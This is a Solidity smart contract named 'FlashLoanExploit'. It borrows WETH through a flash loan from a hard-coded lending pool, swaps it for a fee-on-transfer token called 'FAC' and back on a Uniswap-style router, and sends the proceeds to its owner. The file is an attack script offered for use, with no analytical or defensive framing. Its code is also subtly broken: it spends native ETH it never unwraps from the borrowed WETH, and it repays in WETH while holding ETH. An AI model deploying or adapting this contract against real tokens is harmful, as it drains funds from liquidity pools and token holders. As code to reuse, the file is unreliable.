// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUniswapV2Router02 {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface ILendingPool {
    function flashLoan(
        address receiver,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract FlashLoanExploit {
    address public owner;
    IUniswapV2Router02 public uniswapRouter;
    address public facToken;
    address public weth;

    ILendingPool public lendingPool = ILendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    constructor(address _uniswapRouter, address _facToken, address _weth) {
        owner = msg.sender;
        uniswapRouter = IUniswapV2Router02(_uniswapRouter);
        facToken = _facToken;
        weth = _weth;
    }

    function startFlashLoan(uint256 ethAmount) external {
        require(msg.sender == owner, "Only owner");

        address[] memory assets = new address[](1);
        assets[0] = weth;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = ethAmount;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        bytes memory params = abi.encode(ethAmount);
        lendingPool.flashLoan(address(this), assets, amounts, modes, address(this), params, 0);
    }

    function executeOperation(
        address[] calldata _assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address _initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == address(lendingPool), "Unauthorized");
        (uint256 ethAmount) = abi.decode(params, (uint256));

        address[] memory pathToBuy = new address[](2);
        pathToBuy[0] = weth;
        pathToBuy[1] = facToken;
        uniswapRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethAmount}(
            0,
            pathToBuy,
            address(this),
            block.timestamp + 20 minutes
        );

        IERC20 fac = IERC20(facToken);
        uint256 facBalance = fac.balanceOf(address(this));
        fac.approve(address(uniswapRouter), facBalance);

        address[] memory pathToSell = new address[](2);
        pathToSell[0] = facToken;
        pathToSell[1] = weth;
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            facBalance,
            0,
            pathToSell,
            address(this),
            block.timestamp + 20 minutes
        );

        uint256 totalDebt = amounts[0] + premiums[0];
        IERC20(weth).approve(address(lendingPool), totalDebt);

        return true;
    }

    receive() external payable {}

    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}